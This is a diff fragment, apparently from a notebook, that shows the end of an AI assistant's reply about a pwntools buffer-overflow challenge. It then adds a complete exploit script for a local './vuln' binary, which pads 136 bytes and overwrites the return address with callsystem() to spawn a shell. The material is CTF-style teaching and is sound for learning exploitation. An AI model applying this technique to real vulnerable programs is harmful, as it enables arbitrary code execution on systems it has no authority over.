@@ -128,3 +128,35 @@ AIMessage(content='To solve this challenge using pwntools, we\'ll exploit the bu
  'By following these steps and using pwntools, you can construct an exploit '
  'that leverages the buffer overflow to execute arbitrary code, in this case, '
  'spawning a shell through the `callsystem()` function.')
+
+from pwn import *
+
+# Set the context for pwntools
+context.binary = './vuln'  # Replace 'vuln' with the actual binary name
+elf = context.binary
+
+# Start the process
+p = process(elf.path)
+
+# Optionally attach GDB for debugging
+# gdb.attach(p)  # Uncomment this line to attach GDB
+
+# Since the buffer is 128 bytes, and we're on a 64-bit system,
+# the offset to the return address is 128 bytes (buffer) + 8 bytes (saved RBP) = 136 bytes
+offset = 136
+
+# Get the address of the callsystem function
+callsystem_addr = elf.symbols['callsystem']
+log.info(f"Address of callsystem: {hex(callsystem_addr)}")
+
+# Construct the payload
+payload = flat(
+    b'A' * offset,  # Padding to reach the return address
+    callsystem_addr  # Overwrite return address with callsystem's address
+)
+
+# Send the payload
+p.sendline(payload)
+
+# Switch to interactive mode to interact with the shell
+p.interactive()
